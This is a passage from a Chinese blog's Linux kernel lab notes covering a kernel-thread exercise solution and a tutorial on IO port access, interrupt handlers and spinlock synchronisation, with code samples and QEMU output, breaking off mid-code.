class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Lab 6 - Deferred Work</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exercise #6: kernel thread</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/atomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple kernel thread&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> wq_stop_thread;</span><br><span class="line"><span class="keyword">atomic_t</span> flag_stop_thread;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> wq_thread_terminated;</span><br><span class="line"><span class="keyword">atomic_t</span> flag_thread_terminated;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_thread_f</span><span class="params">(<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;[my_thread_f] Current process id is %d (%s)\n&quot;</span>,</span><br><span class="line">		current-&gt;pid, current-&gt;comm);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> Wait for command to remove module on wq_stop_thread queue. */</span></span><br><span class="line">	wait_event_interruptible(wq_stop_thread,atomic_read(&amp;flag_stop_thread)!=<span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> set flag to mark kernel thread termination */</span></span><br><span class="line">	atomic_set(&amp;flag_thread_terminated,<span class="number">1</span>);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> notify the unload process that we have exited */</span></span><br><span class="line">	wake_up_interruptible(&amp;wq_thread_terminated);</span><br><span class="line">	pr_info(<span class="string">&quot;[my_thread_f] Exiting\n&quot;</span>);</span><br><span class="line">	do_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">kthread_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_info(<span class="string">&quot;[kthread_init] Init module\n&quot;</span>);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> init the waitqueues and flags */</span></span><br><span class="line">	init_waitqueue_head(&amp;wq_stop_thread);</span><br><span class="line">	init_waitqueue_head(&amp;wq_thread_terminated);</span><br><span class="line">	atomic_set(&amp;flag_stop_thread,<span class="number">0</span>);</span><br><span class="line">	atomic_set(&amp;flag_thread_terminated,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> create and start the kernel thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> * <span class="title">kt</span> =</span> kthread_create(my_thread_f,<span class="literal">NULL</span>,<span class="string">&quot;yhellow&quot;</span>);</span><br><span class="line">	wake_up_process(kt);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">kthread_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> notify the kernel thread that its time to exit */</span></span><br><span class="line">	atomic_set(&amp;flag_stop_thread,<span class="number">1</span>);</span><br><span class="line">	wake_up_interruptible(&amp;wq_stop_thread);</span><br><span class="line">	<span class="comment">/* <span class="doctag">TODO:</span> wait for the kernel thread to exit */</span></span><br><span class="line">	wait_event_interruptible(wq_thread_terminated,atomic_read(&amp;flag_thread_terminated) != <span class="number">0</span>);</span><br><span class="line">	pr_info(<span class="string">&quot;[kthread_exit] Exit module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kthread_init);</span><br><span class="line">module_exit(kthread_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">6</span>-kthread<span class="meta"># insmod kthread.ko                 </span></span><br><span class="line">kthread: loading out-of-tree <span class="keyword">module</span> taints kernel.                              </span><br><span class="line">[kthread_init] Init <span class="keyword">module</span>                                                      </span><br><span class="line">[my_thread_f] Current process id is <span class="number">258</span> (yhellow)  </span><br><span class="line">root@qemux86:~/skels/deferred_work/<span class="number">6</span>-kthread<span class="meta"># rmmod kthread.ko                  </span></span><br><span class="line">[my_thread_f] Exiting                                                           </span><br><span class="line">[kthread_exit] Exit modul</span><br></pre></td></tr></table></figure>
<ul>
<li>必须等到内核线程停止以后，内核模块才可以停止</li>
<li>由于内核线程和内核模块是同时运行的，为了使内核模块先停止，做了以下操作：<ul>
<li>在 <code>kthread_exit</code> 执行之前，内核线程会因为 <code>flag_stop_thread = 0</code> 被添加到等待队列中</li>
<li>在 <code>kthread_exit</code> 执行的过程中设置 <code>flag_stop_thread = 1</code>，同时唤醒内核线程（如果不设置 <code>flag_stop_thread = 1</code> 而直接唤醒，就会导致死锁），然后因为 <code>flag_thread_terminated = 0</code> 被添加到等待队列中</li>
<li>在 <code>my_thread_f</code> 中设置 <code>flag_thread_terminated = 1</code>，同时唤醒内核模块</li>
<li>由于唤醒需要时间：内核线程先关闭，内核模块后关闭</li>
</ul>
</li>
<li>本实验只涉及的“单个内核线程”的情况，如果需要处理多个内核线程，则可以使用之前给出的模板</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/15/Linux-Lab4-IO%20access%20and%20Interrupts/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/15/Linux-Lab4-IO%20access%20and%20Interrupts/" class="post-title-link" itemprop="url">Linux-Lab4-IO access and Interrupts</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-10-15 01:51:25" itemprop="dateCreated datePublished" datetime="2022-10-15T01:51:25+08:00">2022-10-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-16 15:25:22" itemprop="dateModified" datetime="2022-10-16T15:25:22+08:00">2022-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>IO access and Interrupts</strong></p>
<p>实验目的：</p>
<ul>
<li>与外围设备通信</li>
<li>实现中断处理程序</li>
<li>将中断与进程上下文同步</li>
</ul>
<p>外围设备通过 Read/Write 其寄存器进行控制：</p>
<ul>
<li>通常，设备具有多个寄存器，可以在内存地址空间或 I/O 地址空间中的连续地址访问这些寄存器</li>
<li>连接到 I/O 总线的每个设备都有一组 I/O 地址，称为 I/O 端口</li>
<li>I/O 端口可以映射到物理内存地址，以便处理器可以通过直接与内存配合使用的指令与设备通信</li>
<li>为简单起见，我们将直接使用 I/O 端口（不映射到物理内存地址）与物理设备进行通信</li>
</ul>
<p>每个器件的 I/O 端口被结构化为一组专用寄存器，以提供统一的编程接口，大多数设备将具有以下类型的寄存器：</p>
<ul>
<li><strong>Control</strong> registers：接收设备命令</li>
<li><strong>Status</strong> registers：包含有关设备内部状态的信息</li>
<li><strong>Input</strong> registers：从设备中获取数据 - Read</li>
<li><strong>Output</strong> registers：在其中写入数据并传输给设备 - Write</li>
</ul>
<p><strong>Accessing the hardware</strong></p>
<p>在 Linux 中，I/O 端口访问在所有体系结构上实现，并且可以使用多个 API</p>
<p>在访问 I/O 端口之前，首先必须请求访问它们，以确保只有一个用户在使用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">struct resource *<span class="title">request_region</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> first, <span class="keyword">unsigned</span> <span class="keyword">long</span> n,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>first</code>：IO 端口的基地址 </li>
<li><code>n</code>：IO 端口占用的范围 </li>
<li><code>name</code>：使用这段 IO 地址的设备名 </li>
</ul>
<p>要释放保留区域 <code>resource</code>，必须使用以下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_region</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BASEPORT 0x3F8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_NR_PORTS 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!request_region(MY_BASEPORT, MY_NR_PORTS, <span class="string">&quot;com1&quot;</span>)) &#123;</span><br><span class="line">     <span class="comment">/* handle error */</span></span><br><span class="line">     <span class="keyword">return</span> -ENODEV;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">release_region(MY_BASEPORT, MY_NR_PORTS);</span><br></pre></td></tr></table></figure>
<p>所有端口请求都可以通过文件从用户空间看到：<code>/proc/ioports</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># cat /proc/ioports                                               </span></span><br><span class="line"><span class="number">0000</span><span class="number">-0</span>cf7 : PCI Bus <span class="number">0000</span>:<span class="number">00</span>                                                     </span><br><span class="line">  <span class="number">0000</span><span class="number">-001f</span> : dma1                                                              </span><br><span class="line">  <span class="number">0020</span><span class="number">-0021</span> : pic1                                                              </span><br><span class="line">  <span class="number">0040</span><span class="number">-0043</span> : timer0                                                            </span><br><span class="line">  <span class="number">0050</span><span class="number">-0053</span> : timer1                                                            </span><br><span class="line">  <span class="number">0060</span><span class="number">-0060</span> : keyboard                                                          </span><br><span class="line">  <span class="number">0064</span><span class="number">-0064</span> : keyboard                                                          </span><br><span class="line">  <span class="number">0080</span><span class="number">-008f</span> : dma page reg                                                      </span><br><span class="line">  <span class="number">00</span>a0<span class="number">-00</span>a1 : pic2                                                              </span><br><span class="line">  <span class="number">00</span>c0<span class="number">-00</span>df : dma2                                                              </span><br><span class="line">  <span class="number">00f</span>0<span class="number">-00f</span>f : fpu  </span><br></pre></td></tr></table></figure>
<p>驱动程序获得所需的 I/O 端口范围后，可以在这些端口上执行读取或写入操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">inb</span><span class="params">(<span class="keyword">int</span> port)</span></span>; <span class="comment">/* reads one byte (8 bits) from port */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">inw</span><span class="params">(<span class="keyword">int</span> port)</span></span>; <span class="comment">/* reads two bytes (16-bit) from ports */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">inl</span> <span class="params">(<span class="keyword">int</span> port)</span></span>; <span class="comment">/* reads four bytes (32-bits) from port */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outb</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> byte, <span class="keyword">int</span> port)</span></span>; <span class="comment">/* writes one byte (8 bits) to port */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outw</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> word, <span class="keyword">int</span> port)</span></span>; <span class="comment">/* writes two bytes (16-bits) to port */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outl</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> word, <span class="keyword">int</span> port)</span></span>; <span class="comment">/* writes four bytes (32-bits) to port */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>读取出来的字符并不是 ASCII，而是注册表值 scancode</li>
<li>我们只需要在按下时选择代码，然后解码 ASCII 字符</li>
<li>PS：键盘 “按下时” 和 “松开时” 是两个不同的 scancode，后面的 <code>is_key_press</code> 用于展示这个特点</li>
</ul>
<p><strong>Interrupt handling</strong></p>
<p>与其他资源一样，驱动程序必须先访问 Interrupt handling 中断处理程序，然后才能使用它，并在执行结束时释放它：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/interrupt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">irqreturn_t</span> <span class="params">(*<span class="keyword">irq_handler_t</span>)</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">request_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq_no, <span class="keyword">irq_handler_t</span> handler,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *dev_name, <span class="keyword">void</span> *dev_id)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq_no, <span class="keyword">void</span> *dev_id)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>中断处理程序函数在中断上下文中执行，这意味着无法调用阻塞 API</li>
<li>必须避免在中断处理程序中执行大量工作，而是在需要时使用延迟工作</li>
</ul>
<p>中断处理程序函数的签名：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">irqreturn_t</span> (*handler)(<span class="keyword">int</span> irq_no, <span class="keyword">void</span> *dev_id);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>irq_no</code>：中断编号</li>
<li><code>irqerturn_t</code>：标识返回信息<ul>
<li>IRQ_NONE：中断不适用于此设备（共享中断）</li>
<li>IRQ_HANDLED：中断可以直接在中断上下文中处理</li>
<li>IRQ_WAKE_THREAD：计划进程上下文处理函数的运行</li>
</ul>
</li>
</ul>
<p>实例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/interrupt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_BASEPORT 0x3F8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_IRQ 4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">irqreturn_t</span> <span class="title">my_handler</span><span class="params">(<span class="keyword">int</span> irq_no, <span class="keyword">void</span> *dev_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span> =</span> (struct my_device_data *) dev_id;</span><br><span class="line">    <span class="comment">/* if interrupt is not for this device (shared interrupts) */</span></span><br><span class="line">        <span class="comment">/* return IRQ_NONE;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* clear interrupt-pending bit */</span></span><br><span class="line">    <span class="comment">/* read from device or write to device*/</span></span><br><span class="line">    <span class="keyword">return</span> IRQ_HANDLED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">my_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     [...]</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">my_device_data</span> *<span class="title">my_data</span>;</span></span><br><span class="line">     <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">     err = request_irq(MY_IRQ, my_handler, IRQF_SHARED,</span><br><span class="line">                       <span class="string">&quot;com1&quot;</span>, my_data);</span><br><span class="line">     <span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="comment">/* handle error*/</span></span><br><span class="line">         <span class="keyword">return</span> err;</span><br><span class="line">     &#125;</span><br><span class="line">     [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有关系统中断的信息和统计信息可以在 <code>/proc/interrupt</code> 或 <code>/proc/stat</code> 中找到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~<span class="meta"># cat /proc/interrupts                                            </span></span><br><span class="line">           CPU0                                                                 </span><br><span class="line">  <span class="number">0</span>:         <span class="number">71</span>   IO-APIC   <span class="number">2</span>-edge      timer                                   </span><br><span class="line">  <span class="number">1</span>:          <span class="number">9</span>   IO-APIC   <span class="number">1</span>-edge      i8042                                   </span><br><span class="line">  <span class="number">9</span>:          <span class="number">0</span>   IO-APIC   <span class="number">9</span>-fasteoi   acpi                                    </span><br><span class="line"> <span class="number">10</span>:        <span class="number">403</span>   IO-APIC  <span class="number">10</span>-fasteoi   virtio1, virtio2, virtio5               </span><br><span class="line"> <span class="number">11</span>:         <span class="number">22</span>   IO-APIC  <span class="number">11</span>-fasteoi   virtio3, virtio4, virtio0               </span><br><span class="line"> <span class="number">12</span>:        <span class="number">125</span>   IO-APIC  <span class="number">12</span>-edge      i8042   </span><br></pre></td></tr></table></figure>
<p><strong>Locking</strong></p>
<p>由于中断处理程序在中断上下文中运行，因此可以执行的操作受到限制：</p>
<ul>
<li>无法访问用户空间内存</li>
<li>无法调用阻塞函数，因此不能使用互斥锁（中断发生时，程序会把当前进程的上下文保存到内核栈上，称为中断帧，如果在中断中发生阻塞，<code>schedule</code> 新调用的进程很可能会破坏中断帧），其实这是为了实现中断嵌套所付出的代价 </li>
<li>使用自旋锁进行同步也很棘手（如果所使用的自旋锁，已被正在运行的处理程序中断的进程获取，则可能导致死锁）</li>
</ul>
<p>在某些情况下，设备驱动程序必须使用中断进行同步（例如，当数据在中断处理程序和进程上下文或下半部分处理程序之间共享时），在这些情况下，有必要停用中断并使用自旋锁：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_lock_irqsave</span> <span class="params">(<span class="keyword">spinlock_t</span> * lock, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>; <span class="comment">/* 保存中断的当前状态,禁止本地中断,获取指定的锁 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_unlock_irqrestore</span> <span class="params">(<span class="keyword">spinlock_t</span> * lock, <span class="keyword">unsigned</span> <span class="keyword">long</span> flags)</span></span>; <span class="comment">/* 对指定的锁进行解锁,并恢复到加锁之前的状态 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_lock_irq</span> <span class="params">(<span class="keyword">spinlock_t</span> * lock)</span></span>; <span class="comment">/* 禁止本地中断,获取指定的锁 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spin_unlock_irq</span> <span class="params">(<span class="keyword">spinlock_t</span> * lock)</span></span>; <span class="comment">/* 对指定的锁进行解锁,恢复本地中断 */</span></span><br></pre></td></tr></table></figure>
<p>为了使用在进程上下文和中断处理例程之间共享的资源，将按如下方式使用上述功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IRQ handling routine: interrupt context */</span></span><br><span class="line"><span class="function"><span class="keyword">irqreturn_t</span> <span class="title">kbd_interrupt_handle</span><span class="params">(<span class="keyword">int</span> irq_no, <span class="keyword">void</span> * dev_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock(&amp;lock);</span><br><span class="line">    <span class="comment">/* Critical region - access shared resource */</span></span><br><span class="line">    spin_unlock (&amp;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process context: Disable interrupts when locking */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">my_access</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">    spin_lock_irqsave(&amp;lock, flags);</span><br><span class="line">    <span class="comment">/* Critical region - access shared resource */</span></span><br><span class="line">    spin_unlock_irqrestore(&amp;lock, flags);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_init</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_init (&amp;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>因为系统硬中断 <code>kbd_interrupt_handle</code> 在任何时候都可以发生（内核会直接抢占原来的进程，从而执行硬中断）</li>
<li>如果在 <code>my_access</code> 中拿了自旋锁之后被 <code>kbd_interrupt_handle</code> 抢占，就会发生死锁</li>
<li>如果不在 <code>kbd_interrupt_handle</code> 中加锁，又可能会破坏共享数据（例如：在引用指针之前置空了指针）</li>
<li>因此需要使用 <code>spin_lock_irqsave</code> 在加锁的同时禁止硬中断</li>
</ul>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=interrupts make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>直接看完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 